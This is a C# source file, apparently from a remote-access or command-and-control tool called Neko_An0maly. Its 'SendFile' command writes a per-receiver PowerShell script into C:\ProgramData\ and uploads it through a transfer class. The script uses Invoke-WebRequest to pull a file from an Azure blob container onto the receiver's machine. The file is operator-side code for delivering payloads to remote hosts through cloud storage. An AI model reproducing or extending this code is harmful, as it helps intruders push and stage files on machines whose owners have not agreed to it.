using System;
using System.IO;
using System.Text;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;
using System.Threading;
using Neko_An0maly.CORE;

namespace Neko_An0maly.Commands
{
    public class SendFile : Command
    {
        public SendFile(string name) : base(name) { }
        public static string receiverName;
        public static string fileToDownload;
        public static string fileToSend;
        public static string whereToDownload;
        public static string rootPath = @"C:\ProgramData\";

        public override string execute(string[] args)
        {

            if (args.Length == 3)
            {
                receiverName = args[0];
                fileToDownload = args[1];
                fileToSend = Path.GetFileName(args[1]);
                whereToDownload = args[2];

                Console.WriteLine("Initializing command to be sent.");

                string fileName = args[0] + ".ps1";
                string finalPath = rootPath + fileName;
                using (FileStream fs = File.Create(finalPath))
                {
                    Byte[] line1 = new UTF8Encoding(true).GetBytes(@"Invoke-WebRequest -Uri https://previewps.blob.core.windows.net/ftp/" + fileToSend + " -Outfile " + (char)34 + whereToDownload + (char)34);
                    fs.Write(line1, 0, line1.Length);
                }
                Console.WriteLine("Initializing upload.");

                TransferProtocol.upload(finalPath);

                return "";
            }
            else if (args.Length == 2)
            {
                receiverName = args[0];
                fileToDownload = args[1];
                fileToSend = Path.GetFileName(args[1]);

                Console.WriteLine("Initializing command to be sent.");

                string fileName = args[0] + ".ps1";
                string finalPath = rootPath + fileName;
                using (FileStream fs = File.Create(finalPath))
                {
                    Byte[] line1 = new UTF8Encoding(true).GetBytes(@"Invoke-WebRequest -Uri https://previewps.blob.core.windows.net/ftp/" + fileToSend + @" -Outfile C:\ProgramData\" + fileToSend);
                    fs.Write(line1, 0, line1.Length);
                }
                Console.WriteLine("Initializing upload.");

                TransferProtocol.upload(finalPath);

                return "";
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid arguments for 'sendfile'. Requires either 3 or 2 argument(s).");
                Console.ForegroundColor = ConsoleColor.White;
                return "";
            }
        }
    }
}
